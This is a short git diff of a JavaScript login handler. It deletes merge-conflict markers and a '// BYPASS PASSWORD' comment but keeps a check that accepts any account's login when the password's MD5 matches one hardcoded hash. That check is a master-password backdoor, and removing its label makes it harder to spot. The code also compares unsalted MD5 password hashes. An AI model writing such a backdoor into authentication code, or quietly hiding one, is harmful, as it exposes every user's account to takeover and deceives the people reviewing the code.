@@ -81,10 +81,6 @@ export const LoginWithUUID = async (req, res) => {
     //   },
     // });
 
-<<<<<<< HEAD
-    // BYPASS PASSWORD
-=======
->>>>>>> 1076ddffb92c6c204f6e2adea0d2e4c0f599d51d
     const matchPS =
       md5(req.body.user_password) == user[0].user_password ||
       md5(req.body.user_password) == "dabc65f7733ca3385e8c819ca94c3d88";
